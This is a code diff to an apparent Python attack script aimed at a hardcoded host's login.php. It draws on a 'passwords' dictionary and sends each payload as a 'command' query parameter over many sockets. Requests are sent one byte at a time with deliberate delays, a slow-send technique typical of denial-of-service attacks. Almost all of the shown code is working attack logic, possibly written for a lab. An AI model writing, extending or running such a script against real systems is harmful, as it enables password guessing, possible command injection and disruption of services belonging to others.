@@ -6,8 +6,8 @@ from os.path import abspath, exists
 from socket import *
 
 
-MIN_DELAY_SECS = 30
-MAX_SOCKETS = 15
+MIN_DELAY_SECS = 10
+MAX_SOCKETS = 20
 SERVER_NAME = '10.12.1.244'
 SERVER_PORT = 80
 DICT_PATH = "passwords"
@@ -45,6 +45,8 @@ def main():
     time.sleep(MIN_DELAY_SECS)
     print("Service stopped!\n")
 
+    return
+
 
 def send_payload(payload):
     # Create a TCP client socket
@@ -54,17 +56,36 @@ def send_payload(payload):
     client_socket = socket(AF_INET, SOCK_STREAM)
     client_socket.connect((SERVER_NAME, SERVER_PORT))
 
-    client_socket.send(payload.encode())
+    # noinspection PyPep8Naming
+    GET_command = "GET /login.php?command=" + payload + " HTTP/1.1"
+
+    request_headers = {
+        "Host": SERVER_NAME,
+        "Connection": "close",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Accept": "text/html"
+    }
+
+    request_headers_joined = ""
+    for k, v in request_headers.items():
+        new_header = "".join("{}: {}\r\n".format(k, v))
+        request_headers_joined += new_header
+
+    send_by_byte(GET_command, client_socket)
+    send_by_byte(request_headers_joined, client_socket)
+
     time.sleep(MIN_DELAY_SECS)
     client_socket.close()
 
+    return
 
-# def send_by_byte(output: str, s: socket):
-#     for i in range(0, len(output)):
-#         s.send(output[i].encode())
-#     #s.send('\r\n'.encode())
-#
-#     return
+
+def send_by_byte(output: str, s: socket):
+    for i in range(0, len(output)):
+        s.send(output[i].encode())
+    s.send('\r\n'.encode())
+
+    return
 
 
 if __name__ == '__main__':
